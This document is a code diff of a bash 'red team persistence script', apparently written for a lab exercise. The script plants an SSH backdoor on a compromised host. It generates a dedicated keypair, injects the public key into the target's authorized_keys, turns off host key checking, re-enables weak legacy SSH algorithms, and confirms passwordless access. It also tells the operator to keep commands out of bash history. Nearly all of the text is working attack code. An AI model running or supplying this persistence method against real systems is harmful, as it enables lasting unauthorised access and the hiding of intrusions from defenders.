@@ -2,7 +2,7 @@
 
 # =======================================================
 #   IRTx Red Team - Persistence Script
-#   Author: DataTrust Red Team
+#   Author: DataTreach Red Team
 #   Description: Establishes SSH backdoor via public key
 #                injection into compromised target host.
 #   Run from: Kali (Red Team Machine)
@@ -29,13 +29,18 @@ echo -e "${CYAN}        IRTx Red Team — Persistence Script${RESET}"
 echo -e "${YELLOW}                   DataBreach${RESET}"
 echo ""
 
-# Add this reminder at the top after banner
+# --- Root check ---
+if [[ $EUID -ne 0 ]]; then
+    echo -e "${RED}[!] This script must be run as root. Use sudo.${RESET}"
+    exit 1
+fi
+
 echo -e "${RED}[!] Always run as root: sudo ./persistence.sh${RESET}"
 echo -e "${YELLOW}    Key will be saved to /root/.ssh/irtx_backdoor${RESET}"
 echo -e "${YELLOW}    Always reconnect with: sudo ssh -i /root/.ssh/irtx_backdoor...${RESET}"
 echo ""
 
-# --- Space-before-commands warning ---
+# --- OPSEC reminder ---
 echo -e "${BOLD}${YELLOW}  ╔══════════════════════════════════════════════════╗${RESET}"
 echo -e "${BOLD}${YELLOW}  ║  OPSEC REMINDER — From this point forward:      ║${RESET}"
 echo -e "${BOLD}${YELLOW}  ║  Use a SPACE before every command you type       ║${RESET}"
@@ -43,12 +48,6 @@ echo -e "${BOLD}${YELLOW}  ║  manually so it is excluded from bash history.   
 echo -e "${BOLD}${YELLOW}  ║  Example:  [SPACE]ssh root@10.30.0.235           ║${RESET}"
 echo -e "${BOLD}${YELLOW}  ╚══════════════════════════════════════════════════╝${RESET}"
 echo ""
-
-# --- Root check ---
-if [[ $EUID -ne 0 ]]; then
-    echo -e "${RED}[!] This script must be run as root. Use sudo.${RESET}"
-    exit 1
-fi
 
 # --- Dependency checks ---
 for tool in ssh-keygen ssh-copy-id ssh; do
@@ -70,7 +69,7 @@ echo ""
 echo -e "${YELLOW}[?] Enter the compromised target IP address:${RESET}"
 read -r TARGET_IP
 
-echo -e "${YELLOW}[?] Enter the username on the target (e.g. root, msfadmin):${RESET}"
+echo -e "${YELLOW}[?] Enter the username on the target (e.g. gazelle, msfadmin):${RESET}"
 read -r TARGET_USER
 
 echo -e "${YELLOW}[?] Enter the SSH port on the target (default: 22):${RESET}"
@@ -83,13 +82,11 @@ echo ""
 
 # =======================================================
 # STEP 2: GENERATE SSH KEY PAIR ON KALI
-# Creates a dedicated IRTx keypair so we don't mix with
-# existing Kali keys. Saved to ~/.ssh/irtx_backdoor
 # =======================================================
 echo -e "${MAGENTA}[>] Step 2: Generating SSH Key Pair on Kali ...${RESET}"
 echo ""
 
-KEY_PATH="$HOME/.ssh/irtx_backdoor"
+KEY_PATH="/root/.ssh/irtx_backdoor"
 
 if [ -f "$KEY_PATH" ]; then
     echo -e "${YELLOW}[~] Key already exists at $KEY_PATH${RESET}"
@@ -109,6 +106,8 @@ if [ ! -f "$KEY_PATH" ]; then
         -N "" \
         -C "irtx-redteam-backdoor" \
         -q
+    chmod 600 "$KEY_PATH"
+    chmod 644 "$KEY_PATH.pub"
     echo -e "${GREEN}[+] Key pair generated:${RESET}"
     echo -e "    ${CYAN}Private key : $KEY_PATH${RESET}"
     echo -e "    ${CYAN}Public key  : $KEY_PATH.pub${RESET}"
@@ -118,20 +117,18 @@ echo ""
 
 # =======================================================
 # STEP 3: INJECT PUBLIC KEY INTO TARGET
-# Uses ssh-copy-id to push the public key into the
-# target's authorized_keys file.
-# The operator will need to enter the target password
-# once — after this, password is no longer needed.
 # =======================================================
 echo -e "${MAGENTA}[>] Step 3: Injecting Public Key into Target ...${RESET}"
 echo ""
-echo -e "${YELLOW}[!] You will be prompted for the target's SSH password once.${RESET}"
+echo -e "${YELLOW}[!] You will be prompted for the target SSH password once.${RESET}"
 echo -e "${YELLOW}    After this, password login will no longer be required.${RESET}"
 echo ""
 
 ssh-copy-id -i "$KEY_PATH.pub" \
     -p "$SSH_PORT" \
     -o StrictHostKeyChecking=no \
+    -o KexAlgorithms=+diffie-hellman-group1-sha1 \
+    -o HostKeyAlgorithms=+ssh-rsa \
     "$TARGET_USER@$TARGET_IP"
 
 if [ $? -ne 0 ]; then
@@ -149,9 +146,7 @@ echo -e "${GREEN}[+] Public key successfully injected into $TARGET_USER@$TARGET_
 echo ""
 
 # =======================================================
-# STEP 4: VERIFY BACKDOOR — TEST PASSWORDLESS SSH
-# Attempts a connection using the private key only.
-# If successful, the backdoor is confirmed working.
+# STEP 4: VERIFY BACKDOOR
 # =======================================================
 echo -e "${MAGENTA}[>] Step 4: Verifying Backdoor Connection ...${RESET}"
 echo ""
@@ -159,9 +154,11 @@ echo ""
 ssh -i "$KEY_PATH" \
     -p "$SSH_PORT" \
     -o StrictHostKeyChecking=no \
+    -o KexAlgorithms=+diffie-hellman-group1-sha1 \
+    -o HostKeyAlgorithms=+ssh-rsa \
     -o ConnectTimeout=5 \
     "$TARGET_USER@$TARGET_IP" \
-    "echo '[+] Backdoor confirmed — connected as: \$(whoami) on \$(hostname)'"
+    "echo '[+] Backdoor confirmed — connected as: $(whoami) on $(hostname)'"
 
 if [ $? -eq 0 ]; then
     echo ""
@@ -169,7 +166,7 @@ if [ $? -eq 0 ]; then
 else
     echo ""
     echo -e "${RED}[!] Verification failed — connection did not succeed.${RESET}"
-    echo -e "${YELLOW}    Try manually: ssh -i $KEY_PATH -p $SSH_PORT $TARGET_USER@$TARGET_IP${RESET}"
+    echo -e "${YELLOW}    Try manually: sudo ssh -i $KEY_PATH -p $SSH_PORT $TARGET_USER@$TARGET_IP${RESET}"
 fi
 
 echo ""
@@ -183,7 +180,7 @@ echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━�
 echo -e "  ${YELLOW}Target          :${RESET} $TARGET_USER@$TARGET_IP:$SSH_PORT"
 echo -e "  ${YELLOW}Private key     :${RESET} $KEY_PATH"
 echo -e "  ${YELLOW}Public key      :${RESET} $KEY_PATH.pub"
-echo -e "  ${YELLOW}Re-connect with :${RESET} ssh -i $KEY_PATH -p $SSH_PORT $TARGET_USER@$TARGET_IP"
+echo -e "  ${YELLOW}Re-connect with :${RESET} ${CYAN}sudo ssh -i $KEY_PATH -p $SSH_PORT -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa $TARGET_USER@$TARGET_IP${RESET}"
 echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
 echo ""
 echo -e "${BOLD}${YELLOW}  OPSEC REMINDER:${RESET}"
